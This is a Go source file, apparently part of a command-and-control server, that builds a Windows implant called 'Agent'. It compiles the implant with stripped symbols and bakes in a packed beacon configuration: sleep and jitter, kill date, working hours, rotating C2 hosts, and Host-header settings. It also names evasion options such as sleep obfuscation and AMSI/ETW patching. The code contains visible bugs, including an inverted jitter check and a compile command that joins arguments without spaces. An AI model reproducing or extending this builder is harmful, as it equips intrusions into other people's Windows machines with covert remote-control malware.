package Builder

import (
	TSCommon "AllSecure/TeamServer/Common"
	"AllSecure/TeamServer/Common/Packer"
	"AllSecure/TeamServer/Common/Utility"
	"AllSecure/TeamServer/Common/win32"
	"AllSecure/TeamServer/Crypt"
	"bytes"
	"errors"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"strings"
)

const (
	PayloadDir  = "Payloads"
	PayloadName = "Agent"
)

const (
	FILETYPE_WINDOWS_EXE            = 1
	FILETYPE_WINDOWS_SERVICE_EXE    = 2
	FILETYPE_WINDOWS_DLL            = 3
	FILETYPE_WINDOWS_REFLECTIVE_DLL = 4
	FILETYPE_WINDOWS_RAW_BINARY     = 5
)

const (
	SLEEPOBF_NO_OBF  = 0
	SLEEPOBF_EKKO    = 1
	SLEEPOBF_ZILEAN  = 2
	SLEEPOBF_FOLIAGE = 3
)

const (
	SLEEPOBF_BYPASS_NONE   = 0
	SLEEPOBF_BYPASS_JMPRAX = 1
	SLEEPOBF_BYPASS_JMPRBX = 2
)

const (
	PROXYLOADING_NONE             = 0
	PROXYLOADING_RTLREGISTERWAIT  = 1
	PROXYLOADING_RTLCREATETIMER   = 2
	PROXYLOADING_RTLQUEUEWORKITEM = 3
)

const (
	AMSIETW_PATCH_NONE   = 0
	AMSIETW_PATCH_HWBP   = 1
	AMSIETW_PATCH_MEMORY = 2
)

const (
	ARCHITECTURE_X64 = 1
	ARCHITECTURE_X86 = 2
)

type ListenerConfig struct {
	Name         string   `json:"Name"`
	Method       string   `json:"Method"`
	UserAgent    string   `json:"UserAgent"`
	Headers      []string `json:"Headers"`
	HostHeader   string   `json:"HostHeader"`
	Secure       bool     `json:"Secure"`
	HostRotation string   `json:"HostRotation"`
	Hosts        []string `json:"Hosts"`
	KillDate     int64    `json:"KillDate"`
	WorkingHours string   `json:"WorkingHours"`
}

type BuilderConfig struct {
	Compiler64 string
	Compiler86 string
	Nasm       string
	DebugDev   bool
	SendLogs   bool
}

type AgentBuilder struct {
	buildSource bool
	sourcePath  string
	silent      bool

	Payloads []string

	FilesCreated []string

	CompileDir     string
	FileExtenstion string

	FileType int
	ClientId string

	PatchBinary bool

	ProfileConfig struct {
		Original any

		MagicMzX64 string
		MagicMzX86 string

		ImageSizeX64 int
		ImageSizeX86 int

		ReplaceStringsX64 map[string]string
		ReplaceStringsX86 map[string]string
	}

	ImplantConfig struct {
		Arch           int            `json:"Arch"`
		ListenerType   int            `json:"ListenerType"`
		ListenerConfig ListenerConfig `json:"ListenerConfig"`
		Sleep          string         `json:"Sleep"`
		Jitter         string         `json:"Jitter"`
	}

	ImplantOptions struct {
		Config []byte
	}

	compilerOptions struct {
		Config BuilderConfig

		SourceDirs  []string
		IncludeDirs []string
		CFlags      []string
		Defines     []string

		Main struct {
			Demon string
			Dll   string
			Exe   string
			Svc   string
		}
	}

	outputPath string
}

func NewImplantBuilder(config BuilderConfig, path string) *AgentBuilder {
	var builder = new(AgentBuilder)

	builder.sourcePath = path + "/" + PayloadDir + "/" + "Agent" + "/"
	builder.ImplantConfig.Arch = ARCHITECTURE_X64

	builder.compilerOptions.SourceDirs = []string{
		"src/agent",
		"src/Crypt",
		"src/cstdreplacement",
		"src/Enumeration",
		"src/Helpers",
		"src/Http",
		"src/Package",
		"src/wolfssl",
	}
	builder.compilerOptions.IncludeDirs = []string{
		"include",
		"include/wolfssl/oppenssl",
		"include/wolfssl/wolfcrypt",
		"include/wolfssl/wolfssl",
	}

	/*
	 * -Os                             Optimize for space rather than speed.
	 * -fno-asynchronous-unwind-tables Suppresses the generation of static unwind tables (as opposed to complete exception-handling code).
	 * -masm=intel                     Use the intel assembler dialect
	 * -fno-ident                      Ignore the #ident directive.
	 * -fpack-struct=<number>          Set initial maximum structure member alignment.
	 * -falign-functions=<number>      Align the start of functions to the next power-of-two greater than or equal to n, skipping up to m-1 bytes.
	 * -s                              Remove all symbols
	 * -ffunction-sections             Place each function into its own section.
	 * -fdata-sections                 Place each global or static variable into .data.variable_name, .rodata.variable_name or .bss.variable_name.
	 * -falign-jumps=<number>          Align branch targets to a power-of-two boundary.
	 * -w                              Suppress warnings.
	 * -falign-labels=<number>         Align all branch targets to a power-of-two boundary.
	 * -fPIC                           Generate position-independent code if possible (large mode).
	 * -Wl                             passes a comma-separated list of tokens as a space-separated list of arguments to the linker.
	 * -s                              Remove all symbol table and relocation information from the executable.
	 * --no-seh                        Image does not use SEH.
	 * --enable-stdcall-fixup          Link _sym to _sym@nn without warnings.
	 * --gc-sections                   Decides which input sections are used by examining symbols and relocations.
	 */

	/*

		C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\bin\Hostx86\x86\cl.exe //x86
		C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\bin\Hostx64\x64\cl.exe //x64
			C:\Strawberry\c\bin\x86_64-w64-mingw32-gcc.exe //x64

	*/

	if config.DebugDev {
		builder.compilerOptions.CFlags = []string{
			"",
			"-Os -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl, --no-seh --enable-stdcall-fixup --gc-sections",
		}
	} else {
		builder.compilerOptions.CFlags = []string{"",
			"-Os -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-s -ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl, -s, --no-seh --enable-stdcall-fixup --gc-sections",
		}
	}

	builder.compilerOptions.Main.Exe = "src/main/main.c"

	builder.compilerOptions.Config = config
	builder.PatchBinary = false

	return builder
}

func (ab *AgentBuilder) Build() bool {
	var (
		CompilerCommand string
	)

	ab.CompileDir = "C:\\Windows\\Temp\\" + PayloadDir + "\\"
	err := os.Mkdir(ab.CompileDir, os.ModePerm)
	if err != nil {
		log.Println("[error] attempting to create compile directory: ", err.Error())
		return false
	}

	if ab.outputPath == "" && ab.FileExtenstion != "" {
		ab.SetOutputPath(ab.CompileDir + PayloadName + ab.FileExtenstion)
	}

	Config, err := ab.PatchConfig()
	if err != nil {
		log.Println("[error] attempting to create patch config: ", err)
		return false
	}
	log.Println("[info] Len Config Bytes: ", len(Config))
	ConfigByteString := "{"
	for i := range Config {
		if i == (len(Config) - 1) {
			ConfigByteString += fmt.Sprintf("0x%02x", Config[i])
		} else {
			ConfigByteString += fmt.Sprintf("0x%02x\\,", Config[i])
		}
	}
	ConfigByteString += "}"
	ab.compilerOptions.Defines = append(ab.compilerOptions.Defines, "CONFIG_BYTES="+ConfigByteString)
	log.Println("[info] Config Bytes: ", ConfigByteString)

	if ab.ImplantConfig.Arch == ARCHITECTURE_X64 {
		abs, err := filepath.Abs(ab.compilerOptions.Config.Compiler64)
		if err != nil {
			log.Println("[error] attempting to get absolute path for compiler: ", err)
			return false
		}
		ab.compilerOptions.Config.Compiler64 = abs
		CompilerCommand += "\"" + ab.compilerOptions.Config.Compiler64 + "\" "
	} else {
		abs, err := filepath.Abs(ab.compilerOptions.Config.Compiler86)
		if err != nil {
			log.Println("[error] attempting to get absolute path for compiler: ", err)
			return false
		}
		ab.compilerOptions.Config.Compiler86 = abs
		CompilerCommand += "\"" + ab.compilerOptions.Config.Compiler86 + "\" "
	}

	//add sources
	for _, dir := range ab.compilerOptions.SourceDirs {
		files, err := os.ReadDir(ab.sourcePath + "/" + dir)
		if err != nil {
			log.Println("[error] attempting to read source directory: ", err)
			return false
		}
		for _, f := range files {
			var FilePath = dir + "/" + f.Name()

			// only add the assembly if the agent is x64
			if path.Ext(f.Name()) == ".asm" {
				if (strings.Contains(f.Name(), ".x64.") && ab.ImplantConfig.Arch == ARCHITECTURE_X64) ||
					(strings.Contains(f.Name(), ".x86.") && ab.ImplantConfig.Arch == ARCHITECTURE_X86) {
					rand_name, _ := Crypt.GenerateRandomString(10)
					AsmObj := ab.CompileDir + rand_name + ".o"
					var AsmCompileStr string
					if ab.ImplantConfig.Arch == ARCHITECTURE_X64 {
						AsmCompileStr = fmt.Sprintf(ab.compilerOptions.Config.Nasm+" -f win64 %s -o %s", FilePath, AsmObj)
					} else {
						AsmCompileStr = fmt.Sprintf(ab.compilerOptions.Config.Nasm+" -f win32 %s -o %s", FilePath, AsmObj)
					}
					ab.FilesCreated = append(ab.FilesCreated, AsmObj)
					ab.CompileCmd(AsmCompileStr)
					CompilerCommand += AsmObj + " "
				}
			} else if path.Ext(f.Name()) == ".c" {
				CompilerCommand += FilePath + " "
			}
		}
	}
	// add all include files under include directories
	for _, dir := range ab.compilerOptions.IncludeDirs {
		CompilerCommand += "-I" + dir + " "
	}

	// add all compiler flags
	CompilerCommand += strings.Join(ab.compilerOptions.CFlags, " ")

	// add all definitions. Will compile with -D flag
	// adds preprocessor declarations to the code so that certain code sections will run when
	// the defines are set.
	ab.compilerOptions.Defines = append(ab.compilerOptions.Defines, ab.GetListenerDefinitons()...)
	for _, define := range ab.compilerOptions.Defines {
		CompilerCommand += "-D" + define + " "
	}

	switch ab.FileType { // will only by exe for now
	case FILETYPE_WINDOWS_EXE:
		if ab.ImplantConfig.Arch == ARCHITECTURE_X64 {
			CompilerCommand += "-D MAIN_THREADED -e main"
		} else {
			CompilerCommand += "-D MAIN_THREADED -e _main"
		}
		CompilerCommand += ab.compilerOptions.Main.Exe + " "
		break
	}
	CompilerCommand += "-o" + ab.outputPath

	Success := ab.CompileCmd(CompilerCommand)
	return Success
}

func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
	var (
		AgentConfig = Packer.Packer{}
		Sleep       int
		Jitter      int
		//Alloc        int
		//Execute      int
		//Spawn64      string
		//Spawn86      string
		//ObfTechnique int
		//ObfBypass    int
		//ProxyLoading = PROXYLOADING_NONE
		//StackSpoof   = win32.FALSE
		//Syscall      = win32.FALSE
		//AmsiPatch    = AMSIETW_PATCH_NONE
		err error
	)

	Sleep, err = strconv.Atoi(ab.ImplantConfig.Sleep)
	if err != nil {
		log.Println("[error] failed to convert sleep value to int: ", err)
		return nil, err
	}

	Jitter, err = strconv.Atoi(ab.ImplantConfig.Jitter)
	if err != nil {
		log.Println("[error] failed to convert jitter value to int: ", err)
		return nil, err
	}
	if Jitter < 0 || Jitter > 100 {
		return nil, errors.New("jitter value must be between 0 and 100")
	} else {
		log.Println("[warning] jitter value not set, defaulting to 0")
		Jitter = 0
	}

	AgentConfig.AddInt(Sleep)
	AgentConfig.AddInt(Jitter)

	switch ab.ImplantConfig.ListenerType {
	case TSCommon.HTTP_SERVER:
		var (
			Config = ab.ImplantConfig.ListenerConfig
			err    error
		)
		AgentConfig.AddInt64(Config.KillDate)
		WorkingHours, err := Utility.ParseWorkingHours(Config.WorkingHours)
		if err != nil {
			log.Println("[error] failed to parse working hours: ", err)
		}

		AgentConfig.AddInt32(WorkingHours)

		if strings.ToLower(Config.Method) == "get" {
			return nil, errors.New("[error] Get method is not supported")
		} else {
			AgentConfig.AddWString("POST")
		}

		switch Config.HostRotation {
		case "round-robin":
			AgentConfig.AddInt(0)
			break
		case "random":
			AgentConfig.AddInt(1)
			break
		default:
			AgentConfig.AddInt(1)
			break
		}

		AgentConfig.AddInt(len(Config.Hosts)) // add number of potential hosts to config buffer.
		for _, host := range Config.Hosts {
			var HostAndPort []string

			HostAndPort = strings.Split(host, ":")
			addr := HostAndPort[0]
			port, err := strconv.Atoi(HostAndPort[1])
			if err != nil {
				return nil, errors.New("[error] attempting to convert port to int: " + err.Error())
			}
			AgentConfig.AddWString(addr)
			AgentConfig.AddInt(port)
		}

		if Config.Secure {
			AgentConfig.AddInt(win32.TRUE)
		} else {
			AgentConfig.AddInt(win32.FALSE)
		}

		AgentConfig.AddWString(Config.UserAgent)
		if len(Config.Headers) == 0 { // if headers is zero
			if Config.HostHeader != "" { // if host header is not set
				AgentConfig.AddInt(2)                                // number of headers
				AgentConfig.AddWString("Content-Type: */*")          // content type header
				AgentConfig.AddWString("Host: " + Config.HostHeader) //host header
			} else { // if host header is set
				AgentConfig.AddInt(1)                       //number of headers
				AgentConfig.AddWString("Content-Type: */*") // add content-type header
			}
		} else { // if headers is not zero
			if Config.HostHeader != "" {
				Config.Headers = append(Config.Headers, "Host: "+Config.HostHeader)
			}
			AgentConfig.AddInt(len(Config.Headers)) // add number of headers to config buffer
			for _, header := range Config.Headers {
				AgentConfig.AddWString(header) // add header to config buffer
			}
		}
	}

	return AgentConfig.GetBuffer(), nil
}

func (ab *AgentBuilder) SetOutputPath(path string) {
	ab.outputPath = path
}

func (ab *AgentBuilder) CompileCmd(cmd string) bool {
	var (
		CommandLine = exec.Command("cmd", "/c", cmd)
		stdout      bytes.Buffer
		stderr      bytes.Buffer
		err         error
	)

	CommandLine.Dir = ab.sourcePath
	CommandLine.Stdout = &stdout
	CommandLine.Stderr = &stderr

	err = CommandLine.Run()
	if err != nil {
		log.Println("[error] failed to compile agent: ", err)
		return false
	}
	return true
}

func (ab *AgentBuilder) GetListenerDefinitons() []string {
	var def []string

	switch ab.ImplantConfig.ListenerType {
	case TSCommon.HTTP_SERVER:
		def = append(def, "TRANSPORT_HTTP")
		break
	case TSCommon.SMB_SERVER:
		def = append(def, "TRANSPORT_SMB")
		break
	}
	return def
}
